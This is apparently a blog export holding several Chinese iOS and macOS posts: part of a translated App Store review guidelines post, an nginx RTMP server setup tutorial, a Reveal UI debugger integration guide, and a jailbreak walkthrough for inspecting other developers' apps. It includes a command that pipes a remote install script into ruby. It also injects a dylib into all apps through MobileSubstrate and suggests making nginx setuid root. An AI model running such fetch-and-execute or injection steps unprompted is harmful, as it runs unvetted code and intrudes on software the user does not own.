代码：应用不允许使用自己的机制来解锁应用内容和功能。包括许可证密钥，增强现实的标识，二维码等。在条件不允许的情况下（例如这个功能需要搭配特定的硬件才可以使用，比如天文应用程序在有望远镜的情况下可以扩展它的功能），这些应用可以不使用应用内付费来解锁这些功能。应用程序的功能如果搭配一个被批准的硬件来使用（例如一个玩具），可以只解锁基本的功能，并提供一个应用内付费解锁增值功能。您不允许要求用户购买一个不相关的产品或者参加一个市场营销活动来解锁应用的功能。\n3.1.5 应用之外的商品和服务：如果你的应用允许人们购买商品和服务，但这些商品和服务的消费和该应用无关，你必须使用非IAP的方式完成支付。例如Apple Pay，信用卡和借记卡支付入口。应用程序可以使用批准的虚拟货币进行交易（例如比特币，狗狗币），只要这些付费方式遵守这个应用发布的国家和地区的相关法律法规即可。\n3.1.6 ApplePay：使用Apple Pay的应用程序在出售商品或服务之前，必须提供所有商品和服务的信息给用户。必须正确的使用Apple Pay的品牌和用户界面元素，符合Apple Pay身份识别条款和人机交互界面条款（Apple Pay Identity Guidelines and Human Interface Guidelines）。使用Apple Pay提供定期付款必须提供下述信息：\n定期的时间长度以及明确指出在取消之前定期付款将一直持续每个周期提供什么样的功能和服务实际收费的账单取消定期付款的方式\n3.2 其他商业模式问题下面的列表并不全面，而且拟提交的应用可能会触犯我们以后更新的最新政策。但是这里面也提供了一些额外的你应该和不应该做的内容：\n3.2.1 可接受的方式（i）你的应用可以展示给用户你开发的其他应用，但你的应用程序不能仅仅是提供其他应用程序的目录应用\n（ii）展示或者建议其他的第三方应用的集合，并且这些应用被设计为在特定领域才发挥作用（例如健康管理，航空服务，交通服务），你的应用程序需要提供强大的编辑能力，使得它看起来不像是一个单独的商店页面。\n（iii）当租约过期的时候禁止用户访问特定的需要批准出租的内容（例如电影、电视节目、音乐和书籍）。但是其他的物品和服务不能过期。\n（iv）支付许可可以用于付款或者收费，转移优惠券和票据（例如电影票，优惠券和VIP凭证）。其他用途可能会导致应用被拒绝或者撤销支付许可证书。\n（v）保险类应用必须是免费的，符合发布地区的相关法律法规，且不能使用应用内付费。\n3.2.2 不可接受的方式 （i）展示第三方应用的界面、扩展、插件看起来和App Store很像，或者作为一般的兴趣集合。\n（ii）苹果的硬件和系统内置的功能需要付费才可以解锁，例如通知推送，照相机，陀螺仪。包括苹果服务，例如苹果音乐的访问能力和iCloud存储的访问能力。\n（iii）人为的增加广告的展示量和点击量，包括应用程序被设计为主要展示广告的应用。\n（iv）在应用内为慈善机构募捐资金。这类应用在应用商店必须免费而且必须使用其他方式募捐资金，例如通过短信，网页内支付。\n（v）通过某种方式人为限制应用的使用人群，例如通过位置或者载体来限制。\n设计苹果的客户十分喜欢那些简洁、精致、创新和易于使用的应用，这正是我们希望在应用商店当中看到的。尽管是你在创造出伟大的设计，但下面的这些标准都是通过应用商店审核的最低标准。\n4.1 模仿者拿出你自己的创意，我们知道你具有创意，所以请将你的创意实现出来。不要简单照搬应用商店当中的流行应用，或者仅仅对这个应用的名称和UI进行简单的修改并将其作为自己的应用。除了冒着侵犯他人知识产权的风险外，应用商店也难以搜索到正确的应用，并且这也使得你的同行受到不公正的待遇。\n4.2 最少功能你的应用在除了仅仅包装一个网站页面之外还要包含其他的功能和内容。如果你的应用程序不是特别有用、独特、或者看起来像是一个应用程序，那么它不应该在应用商店上架。如果你的应用没有提供持久的娱乐价值，或者仅限于让人们感觉毛骨悚然，这个应用可能会被拒。如果应用仅仅是一首歌曲或者一部电影，它应该被提交到iTunes Store。如果应用仅仅是一本书或者一本游戏指南，那它应该被提交到iBooks商店。\n4.2.1 应用程序应该按照它的预期目的来调用API和开发框架。并且在应用描述当中明确指出这种融合方式。例如，HomeKit框架应该提供家庭自动化服务，HealthKit应该是基于健康和健身的目的并且集成在健康类应用程序当中。\n4.2.2 除了目录用于提供专门的类别之外。应用程序的主要功能不应该是提供营销材料，广告，网络剪辑，内容聚合或者链接集合。\n4.2.3 你的应用程序应该不依赖其他应用或功能就可以正常工作。\n4.2.4 Apple Watch应用如果看起来像是一个表盘会令用户困惑，因为用户期望Apple Watch具有丰富的功能，例如刷卡，消息提醒和第三方服务。如果你的应用程序使用独特的方式展示时间是具有创造性的（例如对于冲浪爱好者展示潮汐的时间），但是如果你的应用看起来特别像传统的手表的表盘，我们会拒绝它。\n4.2.5 如果应用的主要功能是访问iCloud以及iCloud的文件管理器，你需要提供额外的附加功能来使你的应用批准上架。\n4.3 垃圾应用不要为同一个应用程序创建多个Bundle ID。如果你的应用程序有多个版本，例如针对特定的国家和地区的版本，体育队伍，大学等，考虑提交一个版本的应用但是使用应用内付费来作区分。此外还要避免将你的应用放到已经饱和的分类下。App Store当中已经有了足够多的手电、放屁、打嗝、和某种不好的词语的应用。如果想要往App Store投放垃圾应用可能会导致你的开发者资格被撤销。\n4.4 扩展应用程序扩展必须符合应用程序扩展开发指南（App Extension Programming Guide）或Safari扩展开发指南（Safari Extensions Development Guide），并且如果可能应该包括额外的功能，例如帮助界面，设置界面等。扩展应用的界面不应该包括市场营销内容，广告和应用内付费。\n4.4.1 键盘扩展有一些额外的规则，他们必须：\n提供键盘输入功能（比如键入字符）提供切换输入法的方式在无网络的情况下仍然可以正常使用根据应用扩展开发指南（App Extension Programming Guide）的要求提供数字和符号输入键盘如果键盘输入是这个应用的主要功能，那它的主要类别是工具（Utilities）只基于增强iOS设备输入功能的目的收集用户信息\n4.4.2 Safari扩展必须可以在当前OS X系统上的Safari浏览器上正常运行，它们不能干扰到系统和Safari UI元素，并且绝不能包含恶意或者误导用户的代码。违反此规则会被从开发者当中除名。\n4.5 苹果网站和服务4.5.1 应用可以订阅一些苹果提供的RSS源，例如iTunes Store RSS源。但是不能收集从苹果网站上获得的任何信息（包括apple.com，iTunes Store，App Store，iTunes Connect，开发人员门户网站等），或者创建一个基于这些信息的排名。\n4.5.2 苹果音乐API可以允许用户在使用你的应用的时候访问他们的订阅内容。用户必须主动使用播放、暂停和跳过按钮来访问播放列表，不允许应用擅自访问和播放。此外你的应用不允许要求用户必须付费或者间接赚钱才可以访问苹果音乐服务（例如应用内付费，观看广告，获取用户信息等）。\n4.5.3 不要使用苹果服务去发送垃圾信息，钓鱼，发送垃圾邮件。包括游戏中心，推送消息等。不要尝试反向追踪，扫描，嗅探，或者非法获取玩家ID，别名和其他来自Game Center的信息，否则你会被从开发者当中除名。\n4.5.4 推送通知不得作为应用必选项才能使用这个应用，不能用于广告，促销和直销的目的，或者发送敏感和机密信息。\n4.5.5 只能使用Game Center规定的方式访问Game Center玩家ID等信息，但不能展示在APP当中或者分发给第三方厂商。\n法律应用程序必须遵守当地的所有法律法规才可以正常使用（如果你不确认需要遵守哪些法律法规，请咨询律师）。我们了解这些事情十分复杂，但是保证遵守当地一切适用的法规是你应尽的义务，不仅仅是遵守我们的条款。当然，如果应用程序拉帮结派、煽动和蛊惑人们犯罪的这种鲁莽行为会直接导致应用被拒。\n5.1 隐私保护隐私是苹果生态系统当中的重中之重。你应该谨慎小心的使用收集到的个人信息，以确保你遵守适用的法律条款和苹果开发人员计划许可协议（Apple Developer Program License Agreement）。更不用说这些都是用户对你的的期望。更具体地说：\n5.1.1 数据收集和存储（i）收集用户数据的应用必须具有隐私政策并且安全的取得用户的同意。这包括但不限于应用程序如果使用了HealthKit和其他医疗、健康技术的应用、HomeKit，键盘扩展，Apple Pay，并且包括登陆、访问设备上的用户数据（例如地理位置，通讯录，日历等）。\n（ii）如果你的应用程序不包括明显需要使用用户账户的功能，那么请让用户不登陆的情况下就可以正常使用。应用程序不能要求用户输入用户个人信息来使用其中的功能，但核心功能必要或者法律要求的情况下除外。\n（iii）开发人员如果使用应用窃取用户密码和其他隐私数据会从开发人员当中除名。\n5.1.2 数据的使用和分享（i）你在向用户提供明确的如何使用用户数据的说明文档并取得用户明确的许可之前，你的应用不能使用或者转移用户的数据。\n（ii）如果不是基于提升用户体验，提升软硬件性能或者符合苹果开发者计划许可协议（Apple Developer Program License Agreement）的广告推广目的，不允许使用或者向第三方厂商告知用户数据。\n（iii）从HomeKit API当中获得的数据不允许应用在广告投放和数据挖掘的目的。\n（iv）使用苹果支付并且通过苹果支付获取用户数据的应用，在使用或向第三方厂商告知的时候只能基于促进或改善商品和服务的交付的目的。\n5.1.3 卫生与健康研究健康、健身和医疗数据十分敏感，所以这类应用程序需要遵守额外的规则以保护客户的隐私安全：\n（i）如果目的是打广告或者用户数据挖掘（用于提升健康管理，或者用于获得了批准的科研目的除外），那么应用不得使用或者向第三方披露用户的健康、健身和医疗数据。这些数据来自但不限于HealthKit API，运动和健身功能，或者其他有关健康的学科的研究课题。\n（ii）应用不能向HealthKit以及其他医疗研究和健康管理应用当中写入虚假数据，而且不能够在iCloud上存储健康数据。\n（iii）致力于人类健康相关的学科研究必须在参与者的同意之下才可以进行，或者对于未成年人，他们的父母和监护人的同意之下才可以进行。相关许可条款必须包括（a）性质、宗旨和研究时长；（b）研究程序，风险和参与人的利害关系；（c）数据的保密性和管理方法，包括与第三方共享的任何数据；（d）参与者如果有疑问需要知道的联络方式；（e）参与者如何撤出的机制。\n（iv）如果应用进行健康相关的研究必须具有独立的伦理审查委员会的许可。此类批准必须按照要求提供。\n5.1.4 儿童基于很多因素，在使用来自儿童的数据的时候务必保持谨慎。我们希望您在使用这些数据之前能够仔细了解相关要求和国际适用的法律条款，例如儿童在线隐私保护法（Children‘s online privacy protection act，COPPA）。\n应用程序只能基于提供必要的功能和非年龄相关的娱乐价值的目的下，而且在遵守相关法律的前提下才可以请求获取孩子的生日和父母的联系方式。\n此外，儿童类应用如果需要采集、传输、分享儿童的信息（包括姓名、地址、电子邮件、位置、照片、视频、图画、聊天功能、其他个人数据和与上述任何信息一起使用的永久的标识符），必须提供隐私条款，而且必须符合所有适用于儿童的隐私政策。为了明确起见，如果这类应用需要家长监控，通常这两种情况所需要提供的隐私条款会有所不同。点此了解详细信息。\n5.1.5 位置服务使用位置服务的应用程序必须提供和位置服务直接相关的功能。使用基于位置的API不允许用于提供紧急服务，或者实现自动控制车辆、飞行器以及其他设备（小型的设备例如小型无人机和玩具例外），远程控制汽车警报系统等。在收集、传输和使用用户的位置数据之前，请确保你已经取得了用户的同意。如果应用程序使用了后台定位服务，务必在应用当中阐明其目的。参考人机交互界面条款（Human Interface Guidelines）了解最佳的做法。\n5.2 知识产权确保你的应用只包括你创建的内容，或者在使用他人的内容的时候具有合法的许可协议。如果你在许可协议规定的方式之外使用这些内容可能会被苹果下架你的应用。当然，这也意味着其他盗用你的内容的应用也可能会被下架。如果你认为你的知识产权已经被侵犯，请填写这个表单发起诉讼申请。知识产权相关法规在每个国家和地区有所不同，但你的应用必须避免以下最基本的错误：\n5.2.1 一般而言：不要使用受保护的第三方内容，如商标、版权作品，或者在你的应用当中使用未经专利许可的创意。不要包含误导、虚假，山寨的描述，名称和应用内容在你的应用当中。\n5.2.2 第三方网站&#x2F;服务：如果你的应用使用、访问、展示和商业化第三方的服务，请保证你已经获得了相应的授权许可。并且许可文件必须根据要求在审核前一并提供。\n5.2.3 音频和视频下载：应用程序不能对非法分享、保存、转换或者来自第三方源的数据的非法使用提供方便（第三方来源包括Apple Music, YouTube, SoundCloud, Vimeo等），除非具有相应的合法授权协议。如果应用提供了音视频文件，可能这些文件也会违反知识产权，所以你的应用在提供这些文件和服务的访问能力之前务必具有合法授权协议并且必须按照要求在审核前提供。\n5.2.4 苹果广告代言：不要明示或暗示苹果公司是你的应用的供应商，或者苹果为你的应用的功能和质量代言。如果你的应用被授予“编辑选择奖”，苹果会自动加上这个徽章。\n5.2.5 苹果产品：禁止创建一个应用看起来与苹果已有的产品，用户界面（如Finder），应用（如App Store, iTunes Store或Messages），广告主题相似，并且不允许拼错苹果产品名称（如Iphone, iTunz）。iTunes音乐的预览不允许在取得对应的授权许可之前直接使用。例如作为拼图应用的背景音乐，游戏背景音乐等。如果你的应用展示了Activity圆圈，不允许修改圆圈的显示方式以及它们代表的数据。人机界面交互条款当中对如何使用Activity圆圈有更多的信息。\n5.3 游戏，赌博，彩票赌博、游戏和彩票功能可能是最难以管理也是苹果应用商店当中最普遍的促销方式。只有当你完全明白相关法律风险并且已经准备好足够的时间应对监管部门的审查的时候才可以考虑使用。不过有些事情需要牢记：\n5.3.1 抽奖和竞猜必须由应用开发商赞助\n5.3.2 用于抽奖和竞猜的官方规则必须在应用当中予以提供，并且明确表明苹果公司不是赞助商或者以任何形式参与该活动。\n5.3.3 应用不允许使用应用内付费购买信用点或者虚拟货币，并把它们与实际的货币结合使用，也不允许在应用当中购买彩票，抽奖券，和进行资金转移。\n5.3.4 提供需要使用真实货币进行游戏的应用（例如体育博彩、扑克赌博、赌场游戏和赛马竞猜等）或者提供彩票，必须具有当地相关监管部门的合法的授权许可。而且发行的地区仅限于许可协议规定的地点，并且在应用商店当中必须是免费的。非法赌博的工具，包括计牌客不允许上架到App Store当中。彩票App必须具有下列要素：报酬，中奖几率和奖金。\nAfter提交应用之后一旦你将应用程序和元数据提交到iTunes Connect当中，并且进入审核流程，这里有一些事情你需要牢记：\n时间：应用审核团队会尽快审核你的应用，我们也一直努力加快审核速度。可以在此了解更多有关App审核的信息。\n状态更新：你的应用的当前状态会在iTunes Connect当中直接反映。所以你可以在上面留意你的应用状态。\n加急审核申请：如果你们对时间非常敏感，你们可以点此申请加急审核。请务必当你在真正需要它的情况下才进行加急审核，因为你也需要尊重你的同行。如果我们发现你在滥用这个系统，我们可能会拒绝你的加急申请。\n发布日期：如果你的发布日期设为未来的某个时候，你的应用在到达那个时间点之前不会发布到应用商店上面，即便是已经通过了审核。请记住，你的应用在所有选定的应用商店上架可能需要长达24小时的时间。\n被拒：我们的目标是严格遵守这些准则，但人无完人，如果你的应用程序被拒绝并且你对此表示疑问或者希望提供更多的信息，请使用解决方案中心来和应用审核团队直接沟通。这可能对你的应用尽快上架有帮助，而且这也可能帮助我们完善应用程序审核流程或者让我们发现审核政策当中表述不清的地方。如果你仍然对结果有异议，请点此提出上诉。\n\nApple:We’re excited to see what you come up with next!——我们很期待看到你们未来发布的产品！\n\n参考链接\n中文翻译来源\n官方App Store Review Guidelines\n\n","categories":["iOS"],"tags":["Guidelines","审核指南"]},{"title":"macOS 搭建 RTMP 直播服务器","url":"/2016/07/23/macOS-setup-rtmp-server/","content":"直播开发流程:数据采集→ 数据编码 → 数据传输(流媒体服务器) → 解码数据 → 播放显示本文主要介绍如何搭建RTMP直播服务器以及测试流媒体服务器是否搭建成功。\n\n\nRTMP直播服务器搭建\n安装Homebrew\n$ /usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;\n\nHomebrew添加nginx套件\n$ brew tap homebrew/nginx\n\n安装 nginx 和 rtmp 模块\n$ brew install nginx-full --with-rtmp-module\n\n查看 nginx 安装信息\n$ brew info nginx-full......Docroot is: /usr/local/var/www  The default port has been set in /usr/local/etc/nginx/nginx.conf to 8080 so that  nginx can run without sudo.  nginx will load all files in /usr/local/etc/nginx/servers/.- Tips -Run port 80: $ sudo chown root:wheel /usr/local/Cellar/nginx-full/1.10.1/bin/nginx $ sudo chmod u+s /usr/local/Cellar/nginx-full/1.10.1/bin/nginxReload config: $ nginx -s reloadReopen Logfile: $ nginx -s reopenStop process: $ nginx -s stopWaiting on exit process $ nginx -s quitTo have launchd start homebrew/nginx/nginx-full now and restart at login:  brew services start homebrew/nginx/nginx-fullOr, if you don&#x27;t want/need a background service you can just run:  nginx\n\n从以上信息可以得出\nnginx 安装位置：/usr/local/Cellar/nginx-full/1.10.1\nnginx 配置文件位置：/usr/local/etc/nginx/nginx.conf\n nginx服务器根目录位置：/usr/local/var/www\n\n测试是否能成功启动nginx服务\n$ nginx\n\n在浏览器地址栏输入：http://localhost:8080，出现 Welcome to nginx! 表示nginx安装成功了！\n\n修改nginx.conf配置文件，配置rtmp\n在http节点后面添加rtmp配置\nhttp &#123;    ……&#125;rtmp &#123;    server &#123;        listen 1935;        application mytv &#123;            live on;            record off;        &#125;    &#125;&#125;\n\n重新加载nginx的配置文件\n$ nginx -s reload\n现在我们可以来对推流进行测试了，看看我们的rtmp能不能推流成功。\n\n\n测试服务器推流推流可以使用OBS软件和FFmpeg工具。\nOBS软件下载地址：https://obsproject.com\n软件设置如图：\nffmpeg安装ffmpeg\n$ brew install ffmpeg\n\n使用ffmpeg命令推流桌面\n$ ffmpeg -f avfoundation -i &quot;1:0&quot; -vcodec libx264 -preset ultrafast -acodec aac -f flv rtmp://localhost:1935/mytv/room1\n\n以上命令中&quot;1:0&quot;可以通过查看ffmpeg是否支持对应的设备\n$ ffmpeg -f avfoundation -list_devices true -i &quot;&quot;......[AVFoundation input device @ 0x7fd3a9500b40] AVFoundation video devices:[AVFoundation input device @ 0x7fd3a9500b40] [0] FaceTime HD Camera[AVFoundation input device @ 0x7fd3a9500b40] [1] Capture screen 0[AVFoundation input device @ 0x7fd3a9500b40] AVFoundation audio devices:[AVFoundation input device @ 0x7fd3a9500b40] [0] Built-in Microphone\n\n拉流测试拉流可以使用VLC软件\n软件下载地址：http://www.videolan.org/vlc/index.html\n选择File -&gt; Open Network…\n\n","categories":["MacOS"],"tags":["直播","RTMP"]},{"title":"使用Reveal调试和分析iOS应用UI","url":"/2016/07/27/Reveal/","content":"Reveal是分析、调试iOS应用UI的利器。\nReveal能够在运行时调试和修改iOS应用程序。它能连接到应用程序，并允许开发者编辑各种用户界面参数，这反过来会立即反应在程序的UI上。就像用FireBug调试HTML页面一样，在不需要重写代码、重新构建和重新部署应用程序的情况下就能够调试和修改iOS用户界面。\n\n\n安装RevealReveal 下载地址：http://revealapp.com/download/\n集成指南集成Reveal无需添加任何代码，无需引入任何头文件。库将会在应用启动时自动加载，并在您的应用内部启动必要的Reveal服务。\n三种集成方式静态连接将Reveal的静态库文件连接入应用，是最简单快捷地启用Reveal检视的方式。\n\n警告: 不要将Reveal库文件随着正式应用一起发布。 下面的步骤将会展示如何通过构建配置，而把Reveal静态库文件，仅连接到调试构建的流程中。\n\n\n在Xcode中打开您的iOS工程。\n\n启动Reveal并选择Help → Show Reveal Library in Finder，这将会打开Finder窗口，并显示一个名为iOS-Libraries的文件夹。\n\n\n将 Reveal.framework 文件拖入Xcode中的Project Navigator面板。\n\n\n在下图所显示的Add to targets对话框中，选择所有您希望与Reveal集成的target。可选步骤：选中Copy items if needed，将会把 Reveal.framework 拷贝到工程中——如果您这么做了， 请记住，当更新Reveal至新版本时，也依照上述步骤再次更新此库文件。\n\n\n点击Finish。\n\n\n选择Build Settings标签，在Other Linker Flags的Debug配置项中加入如下配置。\n-ObjC -lz -framework Reveal\n\n\n\n如果您使用的是Xcode 7, 请确认 Reveal.framework 所在的目录在您的工程配置项 “Framework Search Paths” 中。具体的内容看起来会像这样。\nFRAMEWORK_SEARCH_PATHS = $(inherited) &quot;$(SYSTEM_APPS_DIR)/Reveal.app/Contents/SharedSupport/iOS-Libraries&quot;\n\n\n\n在Xcode中，构建并运行您的应用。如果应用运行于真实设备之上，请确保此设备与正在运行Reveal的Mac机器，处于同一Wi-Fi网络中。\n如果一切正常运行，请切换到Reveal应用，此时您的应用应会出现在应用选择器的下拉列表当中。选中您的应用，确认可以看到此时正在模拟器（或设备）中运行的应用界面截图。\n\n\n\n动态加载动态加载允许iOS应用在运行时，可以按需地加载第三方库。采用这种方式，库文件无需连接入应用的可执行文件，而是被加入到了应用Bundle中去，从而在运行时能按需加载。这种方式使得开发者可以在个人应用中，完全自由地控制Reveal库的加载，以及其服务的启动与停止。\n将Reveal加入您的Xcode工程，使得您团队中的其他成员无需任何额外的配置，就可以使用Reveal。\n\n警告: 永远不要将包含Reveal动态库文件的应用正式发布。Apple不允许将含有动态加载库文件的iOS应用发布到Apple商店中。\n\n\n在Xcode中打开您的iOS工程。\n\n启动Reveal并选择Help → Show Reveal Library in Finder，这将会打开Finder窗口，并显示一个名为iOS-Libraries的文件夹。\n\n\n将 libReveal.dylib 文件拖入Xcode中的Project Navigator面板。\n\n\n在下图所显示的Add to targets对话框中，反选所有的target。这确保了Xcode不会在编译时连接动态库文件。可选步骤：选中Copy items if needed，将会把 libReveal.dylib 拷贝到工程中——如果您这么做了， 请记住，当更新Reveal至新版本时，也依照上述步骤再次更新此库文件。\n\n\n点击Finish。\n\n\n在Copy Bundle Resources配置区域中，加入libReveal.dylib。\n\n在Link Binary With Libraries配置项中：\n\n​如果已有libReveal.dylib，请将其移除——不应在编译时连接dylib文件。\n如果下列系统框架与库文件还不存在，请将他们加入：\nlibz.tdb\nCFNetwork.framework\nQuartzCore.framework\nCoreGraphics.framework - Xcode一般默认会在工程中包含此框架文件。\n\n\n\n\n为了能在debugger之外，将库文件动态地载入设备上的应用，您需要在构建过程中加入对libReveal.dylib文件的code sign。\n\n进入target的Build Phases标签页，选择Editor → Add Build Phase → Add Run Script菜单。在Run Script阶段中加入以下内容:\nset -e if [ -n &quot;$&#123;CODE_SIGN_IDENTITY&#125;&quot; ]; then     codesign -fs &quot;$&#123;CODE_SIGN_IDENTITY&#125;&quot; &quot;$&#123;BUILT_PRODUCTS_DIR&#125;/$&#123;FULL_PRODUCT_NAME&#125;/libReveal.dylib&quot; fi\n\n将下面的代码加入到项目中合适的类文件中(例如您的UIApplicationDelegate)，适当修改使之满足您的需要：\nSwift:\n// MARK: - Reveal func loadReveal() &#123;     if NSClassFromString(&quot;IBARevealLoader&quot;) == nil &#123;         let revealLibName = &quot;libReveal&quot; // or &quot;libReveal-tvOS&quot; for tvOS targets         let revealLibExtension = &quot;dylib&quot;         var error: String?         if let dylibPath = NSBundle.mainBundle().pathForResource(revealLibName, ofType: revealLibExtension) &#123;             print(&quot;Loading dynamic library \\(dylibPath)&quot;)             let revealLib = dlopen(dylibPath, RTLD_NOW)             if revealLib == nil &#123;                 error = String(UTF8String: dlerror())             &#125;         &#125; else &#123;             error = &quot;File not found.&quot;         &#125;         if error != nil &#123;             let alert = UIAlertController(title: &quot;Reveal library could not be loaded&quot;,                                         message: &quot;\\(revealLibName).\\(revealLibExtension) failed to load with error: \\(error!)&quot;,                                  preferredStyle: .Alert)             alert.addAction(UIAlertAction(title: &quot;OK&quot;, style: .Default, handler: nil))             UIApplication.sharedApplication().windows.first?.rootViewController?.presentViewController(alert, animated: true, completion: nil)         &#125;     &#125; &#125;\n\nObjective-C:\n#pragma mark - Reveal - (void)loadReveal &#123;     if (NSClassFromString(@&quot;IBARevealLoader&quot;) == nil)     &#123;         NSString *revealLibName = @&quot;libReveal&quot;; // or @&quot;libReveal-tvOS&quot; for tvOS targets         NSString *revealLibExtension = @&quot;dylib&quot;;         NSString *error;         NSString *dyLibPath = [[NSBundle mainBundle] pathForResource:revealLibName ofType:revealLibExtension];         if (dyLibPath != nil)         &#123;             NSLog(@&quot;Loading dynamic library: %@&quot;, dyLibPath);             void *revealLib = dlopen([dyLibPath cStringUsingEncoding:NSUTF8StringEncoding], RTLD_NOW);             if (revealLib == NULL)             &#123;                 error = [NSString stringWithUTF8String:dlerror()];             &#125;         &#125;         else         &#123;             error = @&quot;File not found.&quot;;         &#125;         if (error != nil)         &#123;             NSString *message = [NSString stringWithFormat:@&quot;%@.%@ failed to load with error: %@&quot;, revealLibName, revealLibExtension, error];             UIAlertController *alert = [UIAlertController alertControllerWithTitle:@&quot;Reveal library could not be loaded&quot;                                                                            message:message                                                                     preferredStyle:UIAlertControllerStyleAlert];             [alert addAction:[UIAlertAction actionWithTitle:@&quot;OK&quot; style:UIAlertActionStyleDefault handler:nil]];             [[[[[UIApplication sharedApplication] windows] firstObject] rootViewController] presentViewController:alert animated:YES completion:nil];         &#125;     &#125; &#125;\n\n警告: 不要在发布（release）构建中调用此方法，确保仅是在应用的调试（debug）构建中加载libReveal.dylib。\n\n\n一个简单的集成方式是，在**-[UIApplicationDelegate applicationDidBecomeActive:]方法中调用上面声明的- (void)loadReveal**方法，以确保Reveal库尽早地被加载进来。Swift:\n1. func applicationDidBecomeActive:(application: UIApplication) &#123; self.loadReveal()&#125;\n\nObjective-C:\n(void)applicationDidBecomeActive:(UIApplication *)application&#123;[self loadReveal];&#125;\n\n\n提示: 在-[UIApplicationDelegate applicationDidBecomeActive:]方法返回之前加载库的一个好处是，将会让Reveal服务在应用启动的同时也自动启动。\n\n如果您不希望如上述步骤自动启动Reveal服务，也可以以手动的方式来启动，例如通过一个Debug按钮。在应用启动后，自己调用loadReveal方法，然后再分发一个名为IBARevealRequestStart的NSNotification:Swift:\nfunc startReveal() &#123;    NSNotificationCenter.defaultCenter().postNotificationName(&quot;IBARevealRequestStart&quot;, object: nil)&#125;\n\nObjective-C:\n- (void)startReveal&#123;    [[NSNotificationCenter defaultCenter] postNotificationName:@&quot;IBARevealRequestStart&quot; object:nil];&#125;\n在Xcode中，构建并运行您的应用。如果一切正常运行，请切换到Reveal应用，此时您的应用应会出现在应用选择器的下拉列表当中。选中您的应用，确认可以看到此时正在模拟器（或设备）中运行的应用界面截图。\n\n\n\nCocoaPodsCocoaPods 是一款针对iOS与OSX项目的依赖管理系统。它大大简化了以往Xcode工程里，对第三方库的依赖管理与配置工作。\nCocoaPods提供了Podspec用于将Reveal集成入您的项目。\n\n警告: 不要将连接了Reveal库文件的应用用于正式发布。下面的指南描述了一种使用构建配置来使Reveal静态库文件仅在调试构建中连接的方式。\n此说明要求您在之前已经在项目中配置好了CocoaPods，若不然，请先行配置Cocoapods。\n\n\n将下面内容加入你的Podfile中：\npod &#x27;Reveal-iOS-SDK&#x27;, :configurations =&gt; [&#x27;Debug&#x27;]\n在项目的根目录下执行 pod install 命令（如果之前已经在项目中使用了Cocoapods，请执行 pod update 命令）。\n\n\n从您的Xcode项目中移除Reveal根据您实际所选择的Reveal集成方式，请根据下述相关步骤来移除Reveal。\n一旦库文件成功的移除后，下面的内容将不再会在您的应用启动时出现在Xcode控制台:\nINFO: Reveal Server started (Protocol Version X).\n静态连接\n打开您的Xcode工程。\n从 Project Navigator 中删除 Reveal.framework 的引用。\n在Xcode的 Project Navigator中选中您的工程，对于每一个集成了Reveal得target，请选择 Build Settings 标签页，将下面内容从 Debug 配置中的 Other Linked Flags 设置中移除：\n-framework Reveal\n-ObjC and -lz (删除前请确认此配置内容仅是用于Reveal)。\n\n\n搞定 - 运行应用，确认Reveal没有和应用连接上。\n\n动态连接\n打开您的Xcode工程。\n从 Project Navigator 中删除 libReveal.dylib 的引用。\n在Xcode的 Project Navigator中选中您的工程，对于每一个集成了Reveal得target，选择 Build Phases 标签页，如果下列库文件仅供Reveal使用的话，请将它们从 Link Binary With Libraries 配置中移除：\nlibz.dylib\nCFNetwork.framework\nQuartzCore.framework\nCoreGraphics.framework\n\n\n将自定义的codesign内容从 Build Phases 下的 Run Script 中删除。\n将 loadReveal / startReveal 方法从您的代码中删除。\n搞定 - 运行应用，确认Reveal没有和应用连接上。\n\nCocoaPods\n在您的Podfile文件中删除下面这行内容：\npod &#x27;Reveal-iOS-SDK&#x27;, :configurations =&gt; [&#x27;Debug&#x27;]\n\n在项目的根目录下执行 pod update 命令。\n\n如果您的 Podfile 中只有 Reveal-iOS-SDK 一个pod依赖，请根据此说明，将CocoaPods从项目中完全移除。\n\n搞定 - 运行应用，确认Reveal没有和应用连接上。\n\n\n显示效果\n上图是Reveal的运行界面，其界面主要分成3部分：\n\n左边部分是整个界面的层级关系，在这里可以以树形级层的方式来查看整个界面元素。\n\n中间部分是一个可视化的查看区域，用户可以在这里切换2D或3D的查看方式，这里看到的也是程序运行的实时界面。\n\n右边部边是控件的详细参数查看区域，当我们选中某一个具体的控件时，右边就可以显示出该控件的具体的参数列表。我们除了可以查看这些参数值是否正确外，还可以尝试修改这些值。所有的修改都可以实时反应到中间的实时预览区域。\n\n\n重要提示\n不要将连接了Reveal库文件的应用正式发布。 Reveal的检视机制，会将您应用的许多内部信息暴露出来，而这将很可能导致您的应用被Apple审查团队拒绝发布。Reveal的目的仅用于内部开发与应用调试。\n当iOS应用进入后台后，Reveal服务将会自动停止。 当应用重新打开时，它又会自动启动。\nReveal支持基于iOS 7及更新版本而编译的应用。 构建配置中的iOS Deployment Target也必须是’iOS 7.0’或更新版本。 如果iOS版本太旧，您有可能会在构建应用过程中遇到连接错误。\nReveal使用Bonjour协议来连接运行时的iOS应用。 如果您的iOS应用是运行在真实的设备之上，那么此设备也需要处在同一个网络之内，以便电脑上的Reveal应用能够与之连接。如果您在连接应用时仍遇到问题，请先检查防火墙和代理设置，以确保它们没有阻碍通讯。\n\n用Reveal调试其它应用界面如果你的设备越狱了，那么还可以用Reveal来”调试“其它应用界面，什么时候会有这种奇怪的需求呢？——当我们想学习别人是如何实现界面效果的时候。iOS设备的目录**&#x2F;Library&#x2F;MobileSubstrate&#x2F;DynamicLibraries** 下存放着所有在系统启动时就需要加载的动态链接库，所以我们只需要将Reveal的动态链接库上传到该目录即可。\n对于越狱的设备，我们可以在安装OpenSSH之后，用scp来上传该文件。具体步骤如下：\n将libReveal.dylib 上传到 &#x2F;Library&#x2F;MobileSubstrate&#x2F;DynamicLibraries如果libReveal.dylib没有执行权限，用chmod +x libReveal.dylib命令，给其增加执行权限执行 killall SpringBoard 重启桌面\n","categories":["iOS"],"tags":["Tools","Reveal"]},{"title":"使用Reveal分析别人App的UI布局","url":"/2016/07/27/iOS-Security-Defense-Reveal/","content":"准备工作越狱iOS设备\n如何越狱可以参考盘古越狱的相关文章，具体详情参见链接：http://jailbreak.25pp.com/ppjailbreak/?from=25pp_00119，最新iOS越狱可以支持iOS 9.3.3，也可以看我整理的非官方的越狱文章。\n在Cydia源中安装OpenSSH、MobileSubstrate等工具，之后的文章会讲到其他工具\n\nmacOS 本地安装Reveal具体安装及使用可以参见我之前的文章：http://chaosky.me/2016/07/27/Reveal\n\n\n操作步骤在Cydia中搜索并安装Reveal 